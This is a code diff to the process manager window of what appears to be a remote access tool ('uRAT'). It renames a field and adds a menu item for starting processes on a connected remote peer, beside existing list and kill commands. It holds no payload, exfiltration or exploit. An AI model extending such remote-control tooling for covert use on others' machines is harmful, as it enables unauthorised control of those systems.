@@ -10,7 +10,7 @@ namespace uRAT.ManagersPlugin.ProcessManager.Forms
 {
     public partial class ProcessManagerForm : Form
     {
-        private ProcessManagerOperation _operation;
+        private ProcessManagerOperation _op;
         
 
         public ProcessManagerForm(string peerName, ProcessManagerOperation operation)
@@ -18,9 +18,9 @@ namespace uRAT.ManagersPlugin.ProcessManager.Forms
             InitializeComponent();
             Text = "Process manager - " + peerName;
 
-            _operation = operation;
-            _operation.OnPacketReceived += OperationPacketReceived;
-            _operation.SendPacket(new RefreshProcessesPacket());
+            _op = operation;
+            _op.OnPacketReceived += OperationPacketReceived;
+            _op.SendPacket(new RefreshProcessesPacket());
         }
 
         void OperationPacketReceived(object sender, uNet2.Packet.Events.OperationPacketEventArgs e)
@@ -49,27 +49,32 @@ namespace uRAT.ManagersPlugin.ProcessManager.Forms
 
         private void ProcessManagerForm_FormClosing(object sender, FormClosingEventArgs e)
         {
-            _operation.CloseOperation();
+            _op.CloseOperation();
         }
 
         private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
         {
             listView1.Items.Clear();
-            _operation.SendPacket(new RefreshProcessesPacket());
+            _op.SendPacket(new RefreshProcessesPacket());
         }
 
         private void stopProcessToolStripMenuItem_Click(object sender, EventArgs e)
         {
             foreach (ListViewItem lvItm in listView1.SelectedItems)
             {
-                _operation.SendPacket(new KillProcessPacket(Int32.Parse(lvItm.SubItems[1].Text)));
+                _op.SendPacket(new KillProcessPacket(Int32.Parse(lvItm.SubItems[1].Text)));
             }
 
             if (listView1.SelectedItems.Count > 0)
             {
                 listView1.Items.Clear();
-                _operation.SendPacket(new RefreshProcessesPacket());
+                _op.SendPacket(new RefreshProcessesPacket());
             }
+        }
+
+        private void startProcessToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            new StartProcessForm(_op).Show();
         }
     }
 }
